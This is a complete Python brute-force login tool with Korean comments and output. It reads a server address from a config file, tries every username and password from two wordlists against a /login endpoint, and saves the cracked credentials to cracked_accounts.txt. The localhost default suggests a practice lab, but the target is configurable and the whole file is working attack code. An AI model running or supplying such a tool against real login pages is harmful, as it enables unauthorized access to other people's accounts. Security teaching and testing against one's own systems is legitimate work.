import requests
import time
import os
from colorama import init, Fore

init(autoreset=True)

def load_server_url():
    """server_config.txt에서 서버 주소 읽기"""
    if os.path.exists('server_config.txt'):
        with open('server_config.txt', 'r', encoding='utf-8') as f:
            url = f.read().strip()
            if url:
                return url
    return "http://localhost:5000"  

BASE_URL = load_server_url()
LOGIN_URL = f"{BASE_URL}/login"

def test_login(username, password):
    """로그인 시도"""
    try:
        session = requests.Session()
        data = {'username': username, 'password': password}
        response = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
        return response.status_code == 302
    except:
        return False

def load_file(filename):
    """파일에서 목록 읽기"""
    if not os.path.exists(filename):
        print(Fore.RED + f"[!] 파일을 찾을 수 없습니다: {filename}")
        return []
    
    with open(filename, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    return lines

def main():
    print()
    print(Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                                                                ║")
    print(Fore.CYAN + "║        무차별 대입 공격 도구                          ║")
    print(Fore.CYAN + "║                                                                ║")
    print(Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝")
    print()
    
    # 서버 주소 표시
    print(Fore.CYAN + f"[*] 서버 주소: {BASE_URL}")
    print()
    
    # 파일에서 아이디와 비밀번호 목록 읽기
    print(Fore.YELLOW + "[*] 파일 읽는 중...")
    usernames = load_file('usernames.txt')
    passwords = load_file('passwords.txt')
    
    if not usernames:
        print(Fore.RED + "[!] usernames.txt 파일이 비어있거나 없습니다.")
        print(Fore.YELLOW + "[*] 기본 아이디 사용: admin")
        usernames = ['admin']
    
    if not passwords:
        print(Fore.RED + "[!] passwords.txt 파일이 비어있거나 없습니다.")
        return
    
    print(Fore.GREEN + f"[✓] 아이디 {len(usernames)}개 로드")
    print(Fore.GREEN + f"[✓] 비밀번호 {len(passwords)}개 로드")
    print()
    
    # 공격 시작
    print(Fore.RED + "=" * 70)
    print(Fore.RED + "  공격 시작")
    print(Fore.RED + "=" * 70)
    print()
    
    print(Fore.YELLOW + f"[*] 테스트할 아이디: {len(usernames)}개")
    print(Fore.YELLOW + f"[*] 테스트할 비밀번호: {len(passwords)}개")
    print(Fore.YELLOW + f"[*] 총 시도 횟수: {len(usernames) * len(passwords)}회")
    print()
    
    start_time = time.time()
    total_attempts = 0
    found_accounts = []
    
    for username in usernames:
        print(Fore.CYAN + f"\n[아이디: {username}] 테스트 중...")
        
        for i, password in enumerate(passwords, 1):
            total_attempts += 1
            print(Fore.CYAN + f"  [{i}/{len(passwords)}] {username}:{password:20s}", end='')
            
            if test_login(username, password):
                print(Fore.GREEN + " ✓ 성공!")
                found_accounts.append((username, password))
                break  
            else:
                print(Fore.RED + " ✗")
            
            time.sleep(0.05) 
    
    elapsed = time.time() - start_time
    
    
    print()
    print(Fore.YELLOW + "=" * 70)
    print(Fore.YELLOW + "  테스트 완료")
    print(Fore.YELLOW + "=" * 70)
    print(Fore.YELLOW + f"총 시도 횟수: {total_attempts}회")
    print(Fore.YELLOW + f"소요 시간: {elapsed:.2f}초")
    print()
    
    if found_accounts:
        print(Fore.GREEN + f"✓ 발견된 계정: {len(found_accounts)}개\n")
        for username, password in found_accounts:
            print(Fore.GREEN + f"  - {username} : {password}")
        
        
        with open('cracked_accounts.txt', 'w', encoding='utf-8') as f:
            f.write("발견된 계정 목록\n")
            f.write("=" * 50 + "\n\n")
            for username, password in found_accounts:
                f.write(f"{username}:{password}\n")
        
        print()
        print(Fore.GREEN + "[✓] 결과가 cracked_accounts.txt에 저장되었습니다.")
    else:
        print(Fore.RED + "✗ 발견된 계정이 없습니다.")
    
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[*] 중단되었습니다.")
    except Exception as e:
        print(Fore.RED + f"\n[!] 오류: {e}")
        print(Fore.YELLOW + "\n서버가 실행 중인지 확인하세요!")

